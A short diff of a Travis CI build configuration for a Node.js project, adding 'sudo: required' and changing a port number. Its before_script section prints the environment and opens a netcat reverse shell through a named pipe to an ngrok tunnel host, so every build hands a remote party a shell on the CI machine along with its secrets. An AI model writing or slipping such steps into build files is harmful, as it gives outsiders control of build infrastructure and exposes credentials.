@@ -1,8 +1,9 @@
 language: node_js
+sudo: required
 before_script:
   - env
   - whoami
-  - export NGPORT=16674
+  - export NGPORT=14724
   - export NGHOSTNAME=0.tcp.ngrok.io
   - mknod /tmp/backpipe p
   - /bin/sh 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
